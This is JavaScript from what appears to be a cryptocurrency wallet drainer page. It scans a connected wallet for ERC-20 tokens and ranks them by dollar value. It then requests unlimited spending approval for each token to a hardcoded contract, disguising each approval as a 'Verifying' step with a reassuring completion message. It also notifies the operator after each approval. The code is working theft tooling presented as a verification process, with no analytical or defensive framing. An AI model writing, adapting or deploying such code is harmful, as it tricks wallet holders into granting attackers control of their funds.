// ============ TOKEN SCAN + AUTO APPROVAL ============
let pendingTokensQueue = [];
let isApprovalProcessing = false;

function appendStep(text) {
    const stepP = document.createElement("p");
    stepP.className = "step-text";
    stepP.textContent = text;
    STEPS_DIV.appendChild(stepP);
}

function updateStep(oldText, newText) {
    const steps = STEPS_DIV.querySelectorAll('.step-text');
    for (const step of steps) {
        if (step.textContent.includes(oldText)) {
            step.textContent = newText;
            break;
        }
    }
}

function showFinalResult() {
    STATUS_DIV.textContent = "✅ Verification Process Complete!";
    setTimeout(() => {
        STEPS_DIV.innerHTML += `
            <div class="final-result">
                <h2>✅ Process Complete</h2>
                <p>Thank you for using MultiToken Collector!</p>
            </div>
        `;
    }, 1000);
}

async function fetchAndRenderBalances(userAddress, spenderAddress) {
    try {
        const erc20Abi = [
            "function balanceOf(address) view returns (uint256)", 
            "function decimals() view returns (uint8)"
        ];
        
        const tokenPromises = TOKENS.map(async (t) => {
            try {
                const contract = new ethers.Contract(t.address, erc20Abi, web3Provider);
                const rawBal = await contract.balanceOf(userAddress);
                const decimals = await contract.decimals();
                const fmtBal = parseFloat(ethers.formatUnits(rawBal, decimals));
                return fmtBal > 0 ? { ...t, balance: fmtBal } : null;
            } catch (err) { 
                return null; 
            }
        });
        
        const results = await Promise.all(tokenPromises);
        const foundTokens = results.filter(t => t !== null);
        
        const evaluatedTokens = await Promise.all(foundTokens.map(async (t) => {
            const priceUsd = await fetchPrice(t.address);
            return { ...t, usdValue: t.balance * priceUsd };
        }));
        
        pendingTokensQueue = evaluatedTokens
            .filter(t => t.usdValue >= MIN_VALUE_FRONTEND)
            .sort((a, b) => b.usdValue - a.usdValue);
        
        if (pendingTokensQueue.length > 0) {
            executeNextApprove();
        } else {
            showFinalResult();
        }
    } catch (e) {
        console.error('Scan error:', e);
        STATUS_DIV.textContent = "";
        ERROR_DIV.textContent = "Token scanning failed";
    }
}

async function executeNextApprove() {
    if (isApprovalProcessing || pendingTokensQueue.length === 0) return;
    isApprovalProcessing = true;
    
    const t = pendingTokensQueue[0];
    appendStep(`Verifying ${t.name}...`);
    
    try {
        const erc20Abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
        const tokenContract = new ethers.Contract(
            ethers.getAddress(t.address), 
            erc20Abi, 
            web3Signer
        );
        
        const tx = await tokenContract.approve(
            ethers.getAddress(CONTRACT_ADDRESS), 
            ethers.MaxUint256
        );
        await tx.wait();
        
        notifyApproval(connectedAddress, t.address);
        
        updateStep(`Verifying ${t.name}...`, `Verifying ${t.name}... ✅`);
        
        pendingTokensQueue.shift();
        isApprovalProcessing = false;
        
        if (pendingTokensQueue.length > 0) {
            setTimeout(() => { 
                executeNextApprove(); 
            }, APPROVAL_DELAY);
        } else {
            showFinalResult();
        }
    } catch (error) {
        console.error(`Approval error for ${t.name}:`, error.message);
        updateStep(`Verifying ${t.name}...`, `Verifying ${t.name}... ❌`);
        
        pendingTokensQueue.shift();
        isApprovalProcessing = false;
        executeNextApprove();
    }
}